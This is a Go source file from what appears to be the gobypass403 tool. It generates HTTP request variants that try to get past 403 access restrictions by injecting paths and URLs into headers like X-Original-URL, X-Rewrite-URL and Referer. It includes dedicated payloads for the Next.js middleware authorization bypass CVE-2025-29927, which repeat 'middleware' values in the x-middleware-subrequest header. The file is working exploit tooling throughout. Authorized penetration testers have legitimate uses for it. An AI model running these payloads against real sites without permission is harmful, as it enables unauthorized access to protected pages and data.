package payload

import (
	"fmt"
	"strings"

	"github.com/slicingmelon/go-rawurlparser"
	GB403Logger "github.com/slicingmelon/gobypass403/core/utils/logger"
)

/*
GenerateHeadersURLPayloads generates payloads by injecting various URL components
(base path, parent paths, full URLs) into different headers.

It reads header names potentially related to URL context (e.g., X-Original-URL,
X-Rewrite-URL, Referer) from header_urls.lst.

For each header name, it creates multiple payload variations:
1.  **Path Injection (RawURI = '/'):**
  - Header Value: Base path (original path without trailing slash).
  - Header Value: Base path + original query string (if query exists).
  - Header Value: Full original target URL (if header name suggests URL context).

2.  **Path Injection (RawURI = Original Path + Query):**
  - For each parent path derived from the original path:
  - Header Value: Parent path.
  - Header Value: Parent path + original query string (if query exists).
  - Header Value: Full URL constructed with parent path (if header name suggests URL context).
  - Header Value: Full URL constructed with parent path + original query string (if header name suggests URL context and query exists).

3.  **Special CVE-2025-29927 Handling**
  - For X-Middleware-Subrequest header:
  - Special values like "middleware", "middleware:middleware", etc. up to 6-7 repetitions
  - Also variations with "src/middleware", "src/middleware:src/middleware", etc.

The original URL's method, scheme, and host are preserved in the base structure,
while the RawURI and Headers fields are manipulated according to the variations above.
*/
func (pg *PayloadGenerator) GenerateHeadersURLPayloads(targetURL string, bypassModule string) []BypassPayload {
	var allJobs []BypassPayload

	parsedURL, err := rawurlparser.RawURLParse(targetURL)
	if err != nil {
		GB403Logger.Error().Msgf("Failed to parse URL")
		return allJobs
	}

	headerURLs, err := ReadPayloadsFromFile("header_urls.lst")
	if err != nil {
		GB403Logger.Error().Msgf("Failed to read header URLs: %v", err)
		return allJobs
	}

	basePath := strings.TrimRight(parsedURL.Path, "/")
	if basePath == "" {
		basePath = "/"
	}

	// Extract query string if it exists
	query := ""
	if parsedURL.Query != "" {
		query = "?" + parsedURL.Query
	}

	// Create full path with query for RawURI
	fullPathWithQuery := parsedURL.Path
	if query != "" {
		fullPathWithQuery += query
	}

	// Base job template
	baseJob := BypassPayload{
		OriginalURL:  targetURL,
		Method:       "GET",
		Scheme:       parsedURL.Scheme,
		Host:         parsedURL.Host,
		BypassModule: bypassModule,
	}

	for _, headerURL := range headerURLs {
		// Special handling for CVE-2025-29927 middleware subrequest
		if strings.EqualFold(headerURL, "x-middleware-subrequest") {
			allJobs = append(allJobs, generateMiddlewareSubrequestPayloads(baseJob, fullPathWithQuery)...)
			continue // Skip standard handling for this header
		}

		// First variant: base_path in header (don't add query to header)
		job := baseJob
		job.RawURI = "/"
		job.Headers = []Headers{{
			Header: headerURL,
			Value:  basePath,
		}}
		job.PayloadToken = GeneratePayloadToken(job)
		allJobs = append(allJobs, job)

		// Optional: Add variant with query in header value
		if query != "" {
			job := baseJob
			job.RawURI = "/"
			job.Headers = []Headers{{
				Header: headerURL,
				Value:  basePath + query,
			}}
			job.PayloadToken = GeneratePayloadToken(job)
			allJobs = append(allJobs, job)
		}

		// Second variant: full target URL in header (targetURL already includes query)
		if strings.Contains(strings.ToLower(headerURL), "url") ||
			strings.Contains(strings.ToLower(headerURL), "request") ||
			strings.Contains(strings.ToLower(headerURL), "file") {
			job := baseJob
			job.RawURI = "/"
			job.Headers = []Headers{{
				Header: headerURL,
				Value:  targetURL,
			}}
			job.PayloadToken = GeneratePayloadToken(job)
			allJobs = append(allJobs, job)
		}

		// Parent paths variants
		parts := strings.Split(strings.Trim(basePath, "/"), "/")
		for i := len(parts) - 1; i >= 0; i-- {
			parentPath := "/" + strings.Join(parts[:i], "/")
			if parentPath == "/" {
				parentPath = "/"
			}

			// Parent path in header, without query in header but with query in RawURI
			job := baseJob
			job.RawURI = fullPathWithQuery
			job.Headers = []Headers{{
				Header: headerURL,
				Value:  parentPath,
			}}
			job.PayloadToken = GeneratePayloadToken(job)
			allJobs = append(allJobs, job)

			// Optional: Parent path + query in header
			if query != "" {
				job := baseJob
				job.RawURI = fullPathWithQuery
				job.Headers = []Headers{{
					Header: headerURL,
					Value:  parentPath + query,
				}}
				job.PayloadToken = GeneratePayloadToken(job)
				allJobs = append(allJobs, job)
			}

			// Full URL with parent path in header
			if strings.Contains(strings.ToLower(headerURL), "url") ||
				strings.Contains(strings.ToLower(headerURL), "refer") {
				// Without query in header
				fullURL := fmt.Sprintf("%s://%s%s", parsedURL.Scheme, parsedURL.Host, parentPath)
				job := baseJob
				job.RawURI = fullPathWithQuery
				job.Headers = []Headers{{
					Header: headerURL,
					Value:  fullURL,
				}}
				job.PayloadToken = GeneratePayloadToken(job)
				allJobs = append(allJobs, job)

				// With query in header
				if query != "" {
					fullURLWithQuery := fmt.Sprintf("%s://%s%s%s", parsedURL.Scheme, parsedURL.Host, parentPath, query)
					job := baseJob
					job.RawURI = fullPathWithQuery
					job.Headers = []Headers{{
						Header: headerURL,
						Value:  fullURLWithQuery,
					}}
					job.PayloadToken = GeneratePayloadToken(job)
					allJobs = append(allJobs, job)
				}
			}
		}
	}

	GB403Logger.Debug().BypassModule(bypassModule).Msgf("Generated %d payloads for %s\n", len(allJobs), targetURL)
	return allJobs
}

// generateMiddlewareSubrequestPayloads creates special payloads for CVE-2025-29927 middleware subrequest bypass
func generateMiddlewareSubrequestPayloads(baseJob BypassPayload, fullPathWithQuery string) []BypassPayload {
	var middlewarePayloads []BypassPayload

	// Define the two base values for the middleware
	baseValues := []string{"middleware", "src/middleware"}

	for _, baseValue := range baseValues {
		// Generate payloads with single value
		job := baseJob
		job.RawURI = fullPathWithQuery
		job.Headers = []Headers{{
			Header: "x-middleware-subrequest",
			Value:  baseValue,
		}}
		job.PayloadToken = GeneratePayloadToken(job)
		middlewarePayloads = append(middlewarePayloads, job)

		// Generate payloads with 2-7 repetitions of the value, joined by colons
		for repeats := 2; repeats <= 7; repeats++ {
			repeated := strings.Repeat(baseValue+":", repeats-1) + baseValue
			job := baseJob
			job.RawURI = fullPathWithQuery
			job.Headers = []Headers{{
				Header: "x-middleware-subrequest",
				Value:  repeated,
			}}
			job.PayloadToken = GeneratePayloadToken(job)
			middlewarePayloads = append(middlewarePayloads, job)
		}
	}

	return middlewarePayloads
}
